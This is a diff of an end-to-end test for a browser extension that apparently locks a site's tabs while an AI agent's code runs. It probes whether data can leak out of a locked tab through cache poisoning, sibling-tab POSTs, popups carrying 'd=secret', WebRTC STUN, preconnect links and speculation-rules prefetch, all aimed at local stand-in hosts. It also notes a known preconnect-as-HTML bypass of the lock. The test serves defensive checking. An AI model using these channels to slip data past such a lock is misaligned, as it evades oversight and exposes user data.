+      const cached = await run(win.tabId, `(async () => { const c = await caches.open("e2e-poison"); await c.put("/e2e-cached", new Response("planted")); return "planted"; })()`);
+      // TL-4: the other tab of the site posts
+      const sibPost = await run(sib, 'fetch("/e2e-sib-post", { method: "POST", body: "x" }).then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
+      const sibIcon = await this.toolbarIcon(sib);
+      // and a tab of the site opened now
+      const third = await this.ext(`async (url) => (await chrome.tabs.create({ url, active: false })).id`, [`${base}/three.html?e2e=third`]);
+      await sleep(1500);
+      const thirdIcon = await this.toolbarIcon(third);
+      // its panel: the other tab's notice
+      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [sib]);
+      await sleep(1200);
+      const sibNotice = await lockNotice().catch(() => null);
+      await this.ext(`async (id) => { await chrome.tabs.update(id, { active: true }); }`, [win.tabId]);
+      // TL-5: popups from the locked page to another site (with user activation, as a click would give)
+      const page = await this.d.findPage((u) => u.includes('e2e=harden'), { timeoutMs: 5000 });
+      const before = await this.ext('async () => (await chrome.tabs.query({})).map((t) => t.id)');
+      await this.d.eval(page, `async (o) => { window.open(o + "/e2e-popup-noopener?d=secret", "_blank", "noopener"); return true; }`, [other], { userActivation: true });
+      await this.d.eval(page, `async (o) => { window.open(o + "/e2e-popup-opener?d=secret"); return true; }`, [other], { userActivation: true });
+      await sleep(2500);
+      const popups = await this.ext('async (old) => (await chrome.tabs.query({})).filter((t) => !old.includes(t.id)).map((t) => ({ id: t.id, opener: t.openerTabId ?? null }))', [before]);
+      // a page the user opens in a new tab still loads (no initiator)
+      const typed = await this.ext(`async (url) => (await chrome.tabs.create({ url, active: false })).id`, [`${other}/e2e-typed`]);
+      await sleep(1500);
+      // TL-6: WebRTC (STUN to the UDP listener), straight and from a fresh iframe; preconnect three ways;
+      // speculation rules
+      const rtc = (iframe) => `(async () => { try {
+        let W = window;
+        if (${iframe}) { const f = document.createElement("iframe"); document.body.append(f); W = f.contentWindow; }
+        const pc = new W.RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${udp.address().port}" }] });
+        pc.createDataChannel("x");
+        await pc.setLocalDescription(await pc.createOffer());
+        await new Promise((r) => setTimeout(r, 2500));
+        pc.close();
+        return "made";
+      } catch (e) { return "refused: " + e.message; } })()`;
+      const rtcMain = await run(win.tabId, rtc(false));
+      const stunMain = stun;
+      const rtcFrame = await run(win.tabId, rtc(true));
+      const stunFrame = stun - stunMain;
+      await run(win.tabId, `(() => { const l = document.createElement("link"); l.rel = "preconnect"; l.href = "http://127.0.0.1:${tcp.setter.address().port}"; document.head.append(l); return 1; })()`);
+      await run(win.tabId, `(() => { const l = document.createElement("link"); l.setAttribute("rel", "preconnect"); l.setAttribute("href", "http://127.0.0.1:${tcp.attribute.address().port}"); document.head.append(l); return 1; })()`);
+      await run(win.tabId, `(() => { document.head.insertAdjacentHTML("beforeend", '<link rel="preconnect" href="http://127.0.0.1:${tcp.html.address().port}">'); return 1; })()`);
+      const spec = await run(win.tabId, `new Promise((r) => { const s = document.createElement("script"); s.type = "speculationrules"; s.textContent = JSON.stringify({ prefetch: [{ source: "list", urls: ["${other}/e2e-spec?d=secret"] }] }); document.head.append(s); setTimeout(() => r(document.querySelector('script[type="speculationrules"]') ? "kept" : "taken out"), 800); })`);
+      await sleep(2500);
+      // What got through
+      if (reqs('localhost', '/e2e-img-leak').length) open('TL-1', 'a cross-site image reached the other site');
+      const cdnKept = reqs('www.google.com', '/e2e-cdn-2').length > 0;
+      if (reqs(site, '/e2e-shw-post').some((q) => q.method === 'POST')) open('TL-2', 'a blob: SharedWorker posted');
+      if (reqs('localhost', '/e2e-shw-leak').length) open('TL-2', 'a blob: SharedWorker reached another site');
+      if (reqs(site, '/e2e-sw-post').some((q) => q.method === 'POST')) open('TL-2', 'the service worker posted');
+      if (reqs('localhost', '/e2e-sw-leak').length) open('TL-2', 'the service worker reached another site');
+      if (reqs(site, '/e2e-sib-post').some((q) => q.method === 'POST')) open('TL-4', 'another tab of the site posted');
+      if (sibIcon !== 'robot-paused-16.png') open('TL-4', `the other tab's icon: ${sibIcon}`);
+      if (thirdIcon !== 'robot-paused-16.png') open('TL-4', `a tab of the site opened during the lock: icon ${thirdIcon}`);
+      if (!sibNotice) open('TL-4', "the other tab's panel: no notice");
+      if (reqs('localhost', '/e2e-popup-noopener').length) open('TL-5', 'a noopener popup reached another site');
+      if (reqs('localhost', '/e2e-popup-opener').length) open('TL-5', 'a popup (with opener) reached another site');
+      if (stunMain) open('TL-6', `WebRTC sent ${stunMain} STUN packet(s)`);
+      if (stunFrame) open('TL-6', `WebRTC from a fresh iframe sent ${stunFrame} STUN packet(s)`);
+      for (const [n, s] of Object.entries(tcp)) {
+        if (!s.hits) continue;
+        // (a <link> written as HTML: the browser may act on it before the guard can take it out. The
+        // documented bypass of a speed bump: noted, not failed)
+        if (n === 'html') extra.push('preconnect written as HTML opened a connection (the known bypass)');
+        else open('TL-6', `preconnect (${n}) opened a connection`);
+      }
+      if (reqs('localhost', '/e2e-spec').length) open('TL-6', 'speculation rules prefetched another site');
+      extra.push(`typed URL in a new tab ${reqs('localhost', '/e2e-typed').length ? 'loaded' : 'DID NOT load'}`);
+      if (!reqs('localhost', '/e2e-typed').length) open('TL-5', 'a page the user opens in a new tab was blocked');
+      if (!cdnKept) open('TL-1', 'the CDN the page already used was blocked (the page would break)');
+      notes.push(`shared worker: ${shared}`, `service worker: ${worker}`, `other tab POST: ${sibPost}`, `popups: ${JSON.stringify(popups)}`,
+        `WebRTC: ${rtcMain}; from an iframe: ${rtcFrame}`, `speculation rules script: ${spec}`, `cache: ${cached}`, `lock-1 probes ${((Date.now() - t0) / 1000).toFixed(1)} s`);
+      for (const p of popups) await this.ext('async (id) => { await chrome.tabs.remove(id).catch(() => {}); }', [p.id]);
+      await this.ext('async (ids) => { for (const id of ids) await chrome.tabs.remove(id).catch(() => {}); }', [[typed, third]]);
+      // ---- unlock: the panel's Reload. The service worker and cache left: cleared, no question (TL-3)
+      await press('Reload');
+      await waitFor('the tab unlocked', async () => (await lockNotice()) === null || null, { timeoutMs: 20000 });
+      await waitFor('the page', async () => (await this.ext(`async (id) => (await chrome.tabs.get(id)).status`, [win.tabId])) === 'complete' || null, { timeoutMs: 15000 });
+      const left1 = await run(win.tabId, '(async () => ({ caches: await caches.keys(), workers: (await navigator.serviceWorker.getRegistrations()).length }))()');
+      if (/e2e-poison/.test(left1) || !/"workers":\s*0/.test(left1)) open('TL-3', `after the unlocking reload, the site still had what the code left: ${left1}`);
+      notes.push(`after unlock 1: ${left1}`);
+      // the other tab: unlocked with it
+      const sibAfter = await this.toolbarIcon(sib);
+      const sibPost2 = await run(sib, 'fetch("/e2e-sib-post2", { method: "POST", body: "x" }).then((r) => "sent " + r.status, (e) => "blocked: " + e.message)');
+      extra.push(`other tab after: icon ${sibAfter}, POST ${sibPost2}`);
+      if (sibAfter !== 'robot-16.png' || !/^sent/.test(sibPost2)) open('TL-4', `the other tab stayed locked after the first one unlocked: ${sibAfter}, ${sibPost2}`);
+      // the page's own localStorage change: unlocked as usual, with a quiet line in the chat
+      const note = await waitFor('the note in the chat', async () => (await chat())?.messages.find((m) => /saved new data while your agent's code ran/.test(m.text)) || null, { timeoutMs: 10000 }).catch(() => null);
+      if (!note) open('TL-3', 'no note in the chat about the saved data');
+      else extra.push(`chat note: "${note.text}"`);
+      await sleep(500);
+      await this.ext('async (id) => { await chrome.tabs.remove(id).catch(() => {}); }', [sib]);
+      const summary = `${extra.join('; ')}\n${notes.join('\n')}`;
+      fs.writeFileSync(this.r.file(`${this.label}-tablock-hardening.txt`), `${JSON.stringify(found, null, 2)}\n${summary}\n`);
+      const ids = Object.keys(found);
+      if (ids.length) throw new Error(`open: ${ids.map((k) => `${k}: ${found[k].join('; ')}`).join(' | ')}\n${summary}`);
+      return `all closed. ${summary.replace(/\n/g, '; ')}`;
+    } finally {
+      // nothing left locked for the checks after this one
+      if (await lockNotice().catch(() => null)) {
+        await press('Reload').catch(() => {});
+        await waitFor('the tab unlocked', async () => (await lockNotice()) === null || null, { timeoutMs: 15000 }).catch(() => {});
+      }
+      fs.writeFileSync(cfgFile, saved);
+      udp.close();
+      for (const s of Object.values(tcp)) s.close();
+      await run(win.tabId, '(async () => { localStorage.removeItem("e2e-own"); localStorage.removeItem("e2eOwnNamed"); document.cookie = "e2eown=; max-age=0"; for (const n of await caches.keys()) await caches.delete(n); for (const r of await navigator.serviceWorker.getRegistrations()) await r.unregister(); return 1; })()').catch(() => {});
       await this.panel(`async () => { document.getElementById('input').value = ''; }`).catch(() => {});
       await this.ext(`async (k) => { await chrome.storage.local.remove(k); }`, [`chat:${site}`]).catch(() => {});
     }
@@ -3334,6 +3795,8 @@ say({ type: 'result', subtype: 'success', is_error: false, result: text, session
       // (the sandboxed mods' test page: its hostile mod's refusals and the errors the good one throws on purpose)
       // (Chrome names the page the tab had when its console was first attached, so by the text)
       || (this.sandboxPage && (/^\[TRIF\] 127\.0\.0\.1\/e2e-(sbx|pw|broke)/.test(String(p.text)) || /willReadFrequently/.test(String(p.text)) || /AudioContext was not allowed to start/.test(String(p.text)) || /\/sandbox\.html/.test(String(p.source || ''))))
+      // (the tab-lock edges: the probes the lock refuses, tabLockHardeningCheck)
+      || (this.hardened && /e2e-(img-leak|shw-|sw-|popup-|spec|cdn|sib-post)|e2e-sw\.js|RTCPeerConnection|TRIF paused|SharedWorker|ServiceWorker|speculation/i.test(String(p.text) + String(p.source || '')))
       || (this.hijacked && /ERR_BLOCKED_BY_CLIENT|NetworkError when attempting to fetch|Failed to fetch|establish a connection to the server at ws:\/\/[^ ]+\/e2e-socket|WebSocket connection to '[^']+\/e2e-socket|e2e-leak|e2e-nav|blocked by|CORS/i.test(String(p.text) + String(p.source || '')));
     const problems = (await this.d.consoleProblems()).filter((p) => !expected(p));
     // The agent-made mod and the stand-in pages aren't ours to judge; everything else counts.
